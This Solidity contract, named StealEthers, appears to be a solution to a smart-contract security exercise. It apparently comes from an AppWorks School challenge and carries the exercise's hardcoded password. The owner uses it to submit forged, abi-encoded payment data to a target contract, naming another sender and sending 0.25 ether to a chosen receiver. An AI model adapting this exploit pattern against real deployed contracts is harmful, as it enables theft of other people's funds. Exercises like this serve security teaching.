pragma solidity ^0.8.0;

interface IAbiEncodeDecode {
    function submitEncodeData(bytes calldata data) external;

    struct Payment {
        address receiver;
        uint256 amount;
    }
}

contract StealEthers {
    IAbiEncodeDecode private abiEncodeDecode;
    address immutable owner;


    constructor(address _abiEncodeDecode) {
        abiEncodeDecode = IAbiEncodeDecode(_abiEncodeDecode);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "sorry, you're not owner");
        _;
    }

    function callSubmitEncodeData(bytes memory data) public onlyOwner{
        abiEncodeDecode.submitEncodeData(data);
    }

    function prepareAndCallSubmitEncodeData(
        address sender,
        address receiver
    ) public onlyOwner{
        uint256 amount = 0.25 ether;
        bytes32 _password = "appworks.school.4/10.encode";
        IAbiEncodeDecode.Payment memory payment = IAbiEncodeDecode.Payment(
            receiver,
            amount
        );
        bytes memory data = abi.encode(sender, payment, _password);
        callSubmitEncodeData(data);
    }
}

